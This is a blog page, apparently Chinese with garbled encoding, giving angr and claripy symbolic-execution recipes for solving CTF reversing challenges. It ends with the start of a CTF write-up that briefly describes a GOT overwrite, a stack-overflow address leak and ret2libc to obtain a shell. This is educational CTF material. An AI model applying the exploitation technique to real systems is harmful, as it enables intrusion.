      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = claripy.BVV(<span class="number">0xffffffff</span>, <span class="number">0x4</span>*<span class="number">8</span>)</span><br><span class="line">s = claripy.Solver()</span><br><span class="line"><span class="keyword">if</span>(s.<span class="built_in">eval</span>(a, <span class="number">0</span>)[<span class="number">0</span>] == <span class="number">0xffffffff</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Get!&quot;</span>)</span><br></pre></td></tr></table></div></figure>








        <h3 id="2-è·å–å†…å­˜ç¬¦å·å€¼"   >
          <a href="#2-è·å–å†…å­˜ç¬¦å·å€¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è·å–å†…å­˜ç¬¦å·å€¼" class="headerlink" title="(2)è·å–å†…å­˜ç¬¦å·å€¼"></a>(2)è·å–å†…å­˜ç¬¦å·å€¼</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.entry_state()</span><br><span class="line"><span class="comment">#add rax, qword ptr [rsp + 8]</span></span><br><span class="line">state.regs.rax += state.mem[state.regs.rsp + <span class="number">8</span>].uint64_t.resolved</span><br><span class="line"></span><br><span class="line">result = simgr.found[<span class="number">0</span>].memory.load(flag_addr, <span class="number">40</span>)</span><br><span class="line"><span class="comment">#or get_byte</span></span><br><span class="line">simulation.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(result.get_bytes(<span class="number">0</span>,<span class="number">0x17</span>),cast_to=<span class="built_in">bytes</span>)</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-è¾“å…¥å‚æ•°çš„å€¼"   >
          <a href="#3-è¾“å…¥å‚æ•°çš„å€¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è¾“å…¥å‚æ•°çš„å€¼" class="headerlink" title="(3)è¾“å…¥å‚æ•°çš„å€¼"></a>(3)è¾“å…¥å‚æ•°çš„å€¼</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set</span></span><br><span class="line">initial_state = p.factory.entry_state(args=[binary,argv1])</span><br><span class="line">simgr = p.factory.simgr(inital_state,veritesting=<span class="literal">True</span>)</span><br><span class="line">found = simgr.found[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#get</span></span><br><span class="line">found.solver.<span class="built_in">eval</span>(argv1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#or such as</span></span><br><span class="line">data = claripy.BVS(<span class="string">&#x27;data&#x27;</span>,<span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line">p = angr.Project(path_to_binary, auto_load_libs=<span class="literal">True</span>)</span><br><span class="line">inital_state = p.factory.entry_state(stdin=data)</span><br><span class="line">simgr = p.factory.simgr(inital_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#get</span></span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.stdin.concretize())</span><br></pre></td></tr></table></div></figure>






        <h3 id="4-å‘é‡è¿æ¥"   >
          <a href="#4-å‘é‡è¿æ¥" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å‘é‡è¿æ¥" class="headerlink" title="(4)å‘é‡è¿æ¥"></a>(4)å‘é‡è¿æ¥</h3>
      <p><code>claripy.Concat</code>æ–¹æ³•ç”¨äº<code>bitVector</code>çš„è¿æ¥</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag_chars = claripy.BVS(<span class="string">&#x27;flag_%d&#x27;</span> % <span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">flag = claripy.Concat(flag_chars + claripy.BVV(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#listä¸­çš„å‘é‡</span></span><br><span class="line">flag_chars = [claripy.BVS(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>)]</span><br><span class="line">flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="string">b&#x27;\n&#x27;</span>)])</span><br><span class="line"><span class="comment">#ä¹‹ååœ¨stateä¸­è®¾ç½®stdin=flagå³å¯ä»å‘½ä»¤è¡Œè¾“å…¥å¤šç»„å‘é‡</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="5-è·å–å†…å­˜è¿›è¡Œå¯¹æ¯”"   >
          <a href="#5-è·å–å†…å­˜è¿›è¡Œå¯¹æ¯”" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-è·å–å†…å­˜è¿›è¡Œå¯¹æ¯”" class="headerlink" title="(5)è·å–å†…å­˜è¿›è¡Œå¯¹æ¯”"></a>(5)è·å–å†…å­˜è¿›è¡Œå¯¹æ¯”</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">found.add_constraints(found.memory.load(flag_addr, <span class="number">5</span>) == <span class="built_in">int</span>(binascii.hexlify(<span class="string">b&quot;ASIS&#123;&quot;</span>), <span class="number">16</span>))</span><br></pre></td></tr></table></div></figure>




        <h3 id="6-å¸¸è§æ·»åŠ flagçš„çº¦æŸ"   >
          <a href="#6-å¸¸è§æ·»åŠ flagçš„çº¦æŸ" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-å¸¸è§æ·»åŠ flagçš„çº¦æŸ" class="headerlink" title="(6)å¸¸è§æ·»åŠ flagçš„çº¦æŸ"></a>(6)å¸¸è§æ·»åŠ flagçš„çº¦æŸ</h3>
      <p>å½“è¾“å…¥æŸä¸ªæ•°å­—ï¼Œç»è¿‡è®¡ç®—æ‰“å°flagï¼Œåªæœ‰ç®€å•å‡ æ¡è·¯å¾„æ—¶ï¼Œå°±éœ€è¦å¯¹flagè¿›è¡Œçº¦æŸæ‰èƒ½æ­£å¸¸è¾“å‡ºï¼Œ<code>asisctffinals2015_fake</code></p>
<p>æ·»åŠ çº¦æŸçš„æ—¶å€™ï¼Œä¸èƒ½ä½¿ç”¨<code>eval</code>æ±‚è§£ï¼Œåªèƒ½ä½¿ç”¨<code>load</code></p>

        <h4 id="â‘ æ•´ä¸ªFlagçº¦æŸ"   >
          <a href="#â‘ æ•´ä¸ªFlagçº¦æŸ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æ•´ä¸ªFlagçº¦æŸ" class="headerlink" title="â‘ æ•´ä¸ªFlagçº¦æŸ"></a>â‘ æ•´ä¸ªFlagçº¦æŸ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¿™é‡Œå³ä»£è¡¨flagä¸­åº”è¯¥éƒ½æ˜¯[0~9]æˆ–è€…[a~z][-,_]ï¼Œæœ€ååº”è¯¥ä»¥&#x27;&#125;&#x27;ç»“å°¾</span></span><br><span class="line">flag = found.memory.load(flag_addr, <span class="number">40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">5</span>+<span class="number">32</span>):</span><br><span class="line">    cond_0 = flag.get_byte(i) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    cond_1 = flag.get_byte(i) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    cond_2 = flag.get_byte(i) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    cond_3 = flag.get_byte(i) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">    cond_4 = found.solver.And(cond_0, cond_1)</span><br><span class="line">    cond_5 = found.solver.And(cond_2, cond_3)</span><br><span class="line">    cond_6 = flag.get_byte(i) == <span class="built_in">ord</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    cond_7 = flag.get_byte(i) == <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">    found.add_constraints(found.solver.Or(cond_4, cond_5,cond_6,cond_7))</span><br><span class="line">found.add_constraints(flag.get_byte(<span class="number">32</span>+<span class="number">5</span>) == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡å‘é‡çº¦æŸ"   >
          <a href="#â‘¡å‘é‡çº¦æŸ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å‘é‡çº¦æŸ" class="headerlink" title="â‘¡å‘é‡çº¦æŸ"></a>â‘¡å‘é‡çº¦æŸ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> arg1.chop(<span class="number">8</span>):</span><br><span class="line">    initial_state.add_constraints(b != <span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢å­—ç¬¦çº¦æŸ"   >
          <a href="#â‘¢å­—ç¬¦çº¦æŸ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢å­—ç¬¦çº¦æŸ" class="headerlink" title="â‘¢å­—ç¬¦çº¦æŸ"></a>â‘¢å­—ç¬¦çº¦æŸ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯è§</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    <span class="comment"># We want those flags to be printable characters</span></span><br><span class="line">    state.add_constraints(flag.get_byte(i) &gt;= <span class="number">0x20</span>)</span><br><span class="line">    state.add_constraints(flag.get_byte(i) &lt;= <span class="number">0x7e</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#Or</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dataLen):</span><br><span class="line">    state.solver.add(</span><br><span class="line">    	claripy.Or(</span><br><span class="line">            *(data.get_byte(i) == x <span class="keyword">for</span> x <span class="keyword">in</span> printable)</span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘£ç‰¹æ®Šçº¦æŸ"   >
          <a href="#â‘£ç‰¹æ®Šçº¦æŸ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£ç‰¹æ®Šçº¦æŸ" class="headerlink" title="â‘£ç‰¹æ®Šçº¦æŸ"></a>â‘£ç‰¹æ®Šçº¦æŸ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">found.add_constraints(found.memory.load(flag_addr, <span class="number">5</span>) == <span class="built_in">int</span>(binascii.hexlify(<span class="string">b&quot;ASIS&#123;&quot;</span>), <span class="number">16</span>))</span><br><span class="line">found.add_constraints(flag.get_byte(<span class="number">32</span>+<span class="number">5</span>) == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br></pre></td></tr></table></div></figure>






        <h3 id="7-æ–¹ä¾¿çš„æ ˆæ•°æ®å­˜å–æ“ä½œ"   >
          <a href="#7-æ–¹ä¾¿çš„æ ˆæ•°æ®å­˜å–æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-æ–¹ä¾¿çš„æ ˆæ•°æ®å­˜å–æ“ä½œ" class="headerlink" title="(7)æ–¹ä¾¿çš„æ ˆæ•°æ®å­˜å–æ“ä½œ"></a>(7)æ–¹ä¾¿çš„æ ˆæ•°æ®å­˜å–æ“ä½œ</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">state.regs.rbp = state.regs.rsp</span><br><span class="line">    state.mem[state.regs.rbp - <span class="number">0x74</span>].uint32_t = <span class="number">0x40</span></span><br><span class="line">    state.mem[state.regs.rbp - <span class="number">0x70</span>].uint64_t = <span class="number">0x1000</span></span><br><span class="line">    state.mem[state.regs.rbp - <span class="number">0x68</span>].uint64_t = <span class="number">0x1008</span></span><br><span class="line">    state.mem[state.regs.rbp - <span class="number">0x60</span>].uint64_t = <span class="number">0x1010</span></span><br><span class="line">    state.mem[state.regs.rbp - <span class="number">0x58</span>].uint64_t = <span class="number">0x1018</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="8-è·å–stateçš„è¾“å‡º"   >
          <a href="#8-è·å–stateçš„è¾“å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-è·å–stateçš„è¾“å‡º" class="headerlink" title="(8)è·å–stateçš„è¾“å‡º"></a>(8)è·å–stateçš„è¾“å‡º</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = angr.Project(&quot;/myTest/callBinaryFunc&quot;)</span></span><br><span class="line"><span class="comment">#sm = p.factory.simulation_manager()</span></span><br><span class="line"><span class="built_in">print</span>(sm.deadended[<span class="number">0</span>].posix.stdout.concretize())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å½“éœ€è¦ä»å¤šæ¡è·¯å¾„éå†è·å–flagæ—¶</span></span><br><span class="line">out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> pp <span class="keyword">in</span> simulation.deadended:</span><br><span class="line">    out = pp.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> out:</span><br><span class="line">        final_flag = <span class="built_in">next</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> s: <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> s, out.split()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Success! Solution is: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(final_flag))</span><br></pre></td></tr></table></div></figure>






        <h2 id="2-æ— æ³•è¯†åˆ«çš„å‡½æ•°"   >
          <a href="#2-æ— æ³•è¯†åˆ«çš„å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ— æ³•è¯†åˆ«çš„å‡½æ•°" class="headerlink" title="2.æ— æ³•è¯†åˆ«çš„å‡½æ•°"></a>2.æ— æ³•è¯†åˆ«çš„å‡½æ•°</h2>
      <p>strtol(),strlen()ç­‰ä¸€ç³»åˆ—çš„å­—ç¬¦ä¸²æ“ä½œ</p>

        <h2 id="3-æœ«å°¾åŠ â€™-x00â€™é—®é¢˜"   >
          <a href="#3-æœ«å°¾åŠ â€™-x00â€™é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æœ«å°¾åŠ â€™-x00â€™é—®é¢˜" class="headerlink" title="3.æœ«å°¾åŠ â€™\x00â€™é—®é¢˜"></a>3.æœ«å°¾åŠ â€™\x00â€™é—®é¢˜</h2>
      <p>æœ‰æ—¶å€™ä¼šå‘é‡è®¾ç½®ï¼Œæœ€å¥½åœ¨æœ«å°¾åŠ ä¸Šâ€™\x00â€™ï¼Œä½¿å¾—æŸäº›æƒ…å†µèƒ½å¤Ÿé€šè¿‡ã€‚åŒæ ·çš„å½“æœ‰canaryçš„æ—¶å€™ï¼Œæ²¡åŠæ³•ä»å‹å…¥canaryçš„åœ°æ–¹å¼€å§‹çš„æ—¶å€™ï¼Œè¿™æ—¶å€™æœ€å¥½ç»™canaryå‘é‡åŒ–æˆ–è€…ç»™â€™\x00â€™æˆªæ–­ã€‚<code>sym-write</code></p>

        <h2 id="4-ç¬¦å·å†™é—®é¢˜"   >
          <a href="#4-ç¬¦å·å†™é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ç¬¦å·å†™é—®é¢˜" class="headerlink" title="4.ç¬¦å·å†™é—®é¢˜"></a>4.ç¬¦å·å†™é—®é¢˜</h2>
      <p>åŒæ ·çš„ï¼Œåœ¨å¾ˆå¤šæ—¶å€™ï¼Œæœ€å¥½åŠ ä¸Š<code>&#123;angr.options.SYMBOLIC_WRITE_ADDRESSES&#125;</code>é€‰é¡¹ï¼Œè¿™ä¸ªå…¶å®ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œæœ‰çš„é¢˜ä¸åŠ ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯æœ‰çš„é¢˜ä¸åŠ å°±ä¸è¡Œã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = project.factory.entry_state(add_options=&#123;angr.options.SYMBOLIC_WRITE_ADDRESSES&#125;)</span><br></pre></td></tr></table></div></figure>




        <h2 id="5-32ä½é—®é¢˜"   >
          <a href="#5-32ä½é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-32ä½é—®é¢˜" class="headerlink" title="5.32ä½é—®é¢˜"></a>5.32ä½é—®é¢˜</h2>
      <p>x86çš„32ä½ç¨‹åºä¸‹ï¼Œå‚æ•°ä»æ ˆä¸Šå–ï¼Œæœ‰æ—¶å€™é€šå¸¸éœ€è¦è®¾ç½®è¿™ä¸ªæ‰è¡Œçš„<code>flareon2015_2</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s.memory.store(s.regs.esp+<span class="number">12</span>, s.solver.BVV(<span class="number">50</span>,<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">s.mem[s.regs.esp+<span class="number">8</span>].uint32_t = <span class="number">0x402159</span></span><br><span class="line">s.mem[s.regs.esp+<span class="number">4</span>].uint32_t = <span class="number">0x4010e4</span></span><br><span class="line">s.mem[s.regs.esp].uint32_t = <span class="number">0x401064</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-æ£€æŸ¥é—®é¢˜"   >
          <a href="#6-æ£€æŸ¥é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-æ£€æŸ¥é—®é¢˜" class="headerlink" title="6.æ£€æŸ¥é—®é¢˜"></a>6.æ£€æŸ¥é—®é¢˜</h2>
      <p>æ­£å¸¸æƒ…å†µä¸‹æŸä¸ª state è¢«å‘ç°æ˜¯ä¸å¯æ»¡è¶³æ¡ä»¶çš„ï¼Œé‚£ä¹ˆstateä¼šè¿›è¡Œå›æº¯ï¼Œæ¥ç¡®å®šåˆ°åº•æ˜¯å“ªä¸ªstateä¸è¢«æ»¡è¶³ï¼Œä¹‹åæ‰€æœ‰çš„stateä¼šè¢«æ”¾å…¥åˆ°stashä¸­ã€‚ä½†æ˜¯æœ‰çš„æ—¶å€™å›æº¯å¹¶ä¸å¥½ï¼Œä¼šæ¯”è¾ƒä¸å®¹æ˜“å‡ºç»“æœï¼Œå°¤å…¶æ˜¯è¿ç®—é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ·»åŠ <code>LAZY_SOLVES</code>ï¼Œä¸è¿›è¡Œæ£€æŸ¥ï¼Œå…ˆæŠŠæ‰€æœ‰è·¯å¾„è·‘å®Œã€‚</p>
<p>æ€»çš„æ¥è¯´LAZY_SOLVESæ˜¯åœ¨è·¯å¾„çˆ†ç‚¸å’ŒèŠ±è´¹åœ¨çº¦æŸæ±‚è§£ä¸Šçš„æ—¶é—´ä¹‹é—´çš„å¹³è¡¡ã€‚</p>
<p>åŒæ ·çš„ï¼Œæœ‰çš„ç‰ˆæœ¬æ˜¯é»˜è®¤å¼€å¯ï¼Œæœ‰çš„æ˜¯é»˜è®¤å…³é—­ï¼Œå¯¹åº”ä¿®æ”¹å³å¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">state = p.factory.blank_state(addr=START_ADDR, add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">state = p.factory.blank_state(addr=START_ADDR, remove_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br></pre></td></tr></table></div></figure>

<p>è¯¦è§é¢˜ç›®<code>google2016_unbreakable_1</code></p>
<p>æ¯”è¾ƒé€‚ç”¨äºå½“findè·¯å¾„å’Œavoidè·¯å¾„éƒ½æ¯”è¾ƒå®¹æ˜“æŠµè¾¾çš„æ—¶å€™ï¼Œå³æŸäº›åº“å‡½æ•°è°ƒç”¨æ¯”è¾ƒå°‘ï¼Œä½†æ˜¯è¿ç®—é‡æ¯”è¾ƒåºå¤§çš„æ—¶å€™ï¼Œç±»ä¼¼å¦‚ä¸‹å…¨æ˜¯è¿ç®—çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211210175007.png" alt="image-20211210175000853"></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://docs.angr.io/appendix/options#option-sets" >https://docs.angr.io/appendix/options#option-sets</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hitcon.org/2016/CMT/slide/day1-r1-a-1.pdf" >day1-r1-a-1.pdf (hitcon.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://flagbot.ch/lesson5.pdf" >https://flagbot.ch/lesson5.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="7-æ‰§è¡Œé-textæ®µä»£ç "   >
          <a href="#7-æ‰§è¡Œé-textæ®µä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#7-æ‰§è¡Œé-textæ®µä»£ç " class="headerlink" title="7.æ‰§è¡Œé.textæ®µä»£ç "></a>7.æ‰§è¡Œé.textæ®µä»£ç </h2>
      <p>æ­£å¸¸çš„angråªèƒ½æ‰§è¡Œ.textæ®µçš„ä»£ç ï¼Œä½†æ˜¯æœ‰çš„é¢˜ä¼šæ‰§è¡Œé.textæ®µçš„ä»£ç ï¼Œä¸è¿‡éœ€è¦åœ¨åˆ›å»ºProjectçš„æ—¶å€™åŠ å…¥é€‰é¡¹<code>support_selfmodifying_code=True</code>ï¼Œè¯¦è§é¢˜ç›®<code>tumctf2016_zwiebel</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">project = angr.Project(<span class="string">&quot;zwiebel&quot;</span>, support_selfmodifying_code=<span class="literal">True</span>) </span><br></pre></td></tr></table></div></figure>




        <h2 id="8-æŒ‡å®šè¿è¡Œä»£ç å—æ•°"   >
          <a href="#8-æŒ‡å®šè¿è¡Œä»£ç å—æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-æŒ‡å®šè¿è¡Œä»£ç å—æ•°" class="headerlink" title="8.æŒ‡å®šè¿è¡Œä»£ç å—æ•°"></a>8.æŒ‡å®šè¿è¡Œä»£ç å—æ•°</h2>
      <p>è®¾å®šnï¼Œè¡¨ç¤ºä»stateçš„çŠ¶æ€å¼€å§‹è¿è¡Œ3ä¸ªåŸºæœ¬å—</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation.run(n=<span class="number">3</span>)</span><br></pre></td></tr></table></div></figure>




        <h1 id="å¸®åŠ©"   >
          <a href="#å¸®åŠ©" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¸®åŠ©" class="headerlink" title="å¸®åŠ©"></a>å¸®åŠ©</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://angr.io/api-doc/angr.html#angr.sim_state.SimState" >angr â€” Analysis and Coordination â€” angr 9.0.10689 documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3990" >https://xz.aliyun.com/t/3990</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/61355ing/p/10523147.html" >https://www.cnblogs.com/61355ing/p/10523147.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=9dQFM5O4KFk" >angr Tutorials EP1 - Reverse Engineering 101 - YouTube</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://angr.io/blog/" >angr</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://myts2.cn/2020/05/24/guan-yu-fasterde-na-xie-shi/" >å…³äºFasterçš„é‚£äº›äº‹â€¦ (myts2.cn)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266757.htm" >åŸåˆ›]ç¬¦å·æ‰§è¡Œåœ¨è‡ªåŠ¨åŒ–Pwnä¸­çš„ç®€å•åˆ©ç”¨-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/shellphish/driller" >shellphish/driller: Driller: augmenting AFL with symbolic execution! (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/08/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB/">é™‡åŸæˆ˜ç–«WP</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-08</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-11-08</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>é¢˜çš„è´¨é‡éƒ½æŒºä¸é”™çš„</p>

        <h1 id="ä¸€ã€bbbay"   >
          <a href="#ä¸€ã€bbbay" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€bbbay" class="headerlink" title="ä¸€ã€bbbay"></a>ä¸€ã€bbbay</h1>
      <p>ç­¾åˆ°é¢˜ï¼Œä»»æ„åœ°å€å†™8å­—èŠ‚ï¼Œæ”¹<code>___stack_chk_fail</code>å‡½æ•°gotè¡¨ä¸ºputs_pltå‡½æ•°ï¼Œåˆ å»canaryçš„ä¿æŠ¤ï¼Œç„¶åæ ˆæº¢å‡ºæ³„éœ²åœ°å€è¿”å›starté‡æ–°å¼€å§‹ï¼Œä¹‹åå†æ ˆæº¢å‡ºret2Libcæ¥getshellã€‚</p>
